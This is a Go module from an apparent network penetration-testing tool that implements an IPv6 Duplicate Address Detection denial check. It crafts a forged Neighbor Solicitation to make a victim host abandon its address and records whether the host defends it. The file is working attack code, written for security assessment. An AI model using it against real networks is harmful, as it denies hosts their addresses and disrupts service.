// daddos.go implements the duplicate-address denial check via DAD.
// Impact temporary, restore decay, affects clients: the Neighbor
// Solicitation for the victim's address makes a host that is running DAD
// for it give the address up, and a host that already holds it defends
// it, which the finding records. The DAD window passes on its own after
// the check, so there is nothing to restore.

package ip6

import (
	"context"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type dadDOSFinding struct {
	Action   string `json:"action"`
	Target   string `json:"target"`
	Resisted bool   `json:"resisted"`
	Frames   int    `json:"frames"`
}

// RunDADDOS sends a Neighbor Solicitation for the target's IPv6 victim
// address during DAD to deny the legitimate host's address configuration,
// then waits for the window for a Neighbor Advertisement defending that
// address, which shows the host holds it, and records that in the finding.
// The verdict is pending: whether the host gave up the address needs a
// later probe it does not have. Cancellation while observing returns
// ctx.Err(). A terminal receive error comes back wrapped.
func RunDADDOS(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim6); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	target := deps.Target.Victim6.IP

	pkt, err := craftDADNS(src, target)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "daddos: craft NS")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "daddos: send NS")
	}

	defense, _, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		na, err := decodeNA(data)
		return err == nil && na.TargetAddress.Equal(target)
	})
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "daddos: receive defense")
	}

	detail, _ := json.Marshal(dadDOSFinding{
		Action:   "dad-denial",
		Target:   target.String(),
		Resisted: defense != nil,
		Frames:   1,
	})
	deps.Emitter.Finding("ipv6-nd", detail)

	return check.Pending("no observable: address denial needs a later probe of the victim"), nil
}

// craftDADNS builds a DAD Neighbor Solicitation: source is unspecified,
// destination is the solicited-node multicast for the target.
func craftDADNS(src net.HardwareAddr, target net.IP) ([]byte, error) {
	snMAC := solicitedNodeMAC(target)
	snIP := solicitedNodeIP(target)

	eth := &layers.Ethernet{
		DstMAC:       snMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   255,
		SrcIP:      net.IPv6zero, // DAD: source is unspecified
		DstIP:      snIP,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeNeighborSolicitation, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	ns := &layers.ICMPv6NeighborSolicitation{
		TargetAddress: target,
		Options: layers.ICMPv6Options{
			{
				Type: layers.ICMPv6OptSourceAddress,
				Data: src, // attacker's source LLA
			},
		},
	}
	return craft.Default(eth, ip, icmp, ns)
}

// decodeNA decodes an ICMPv6 Neighbor Advertisement from raw frame
// bytes (Ethernet, IPv6, ICMPv6, NA).
func decodeNA(data []byte) (*layers.ICMPv6NeighborAdvertisement, error) {
	pkt := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)
	naLayer := pkt.Layer(layers.LayerTypeICMPv6NeighborAdvertisement)
	if naLayer == nil {
		return nil, errs.Msg("no neighbor advertisement layer")
	}
	na, ok := naLayer.(*layers.ICMPv6NeighborAdvertisement)
	if !ok {
		return nil, errs.Msg("unexpected NA layer type")
	}
	return na, nil
}

var _ gopacket.SerializableLayer = (*layers.ICMPv6NeighborSolicitation)(nil)
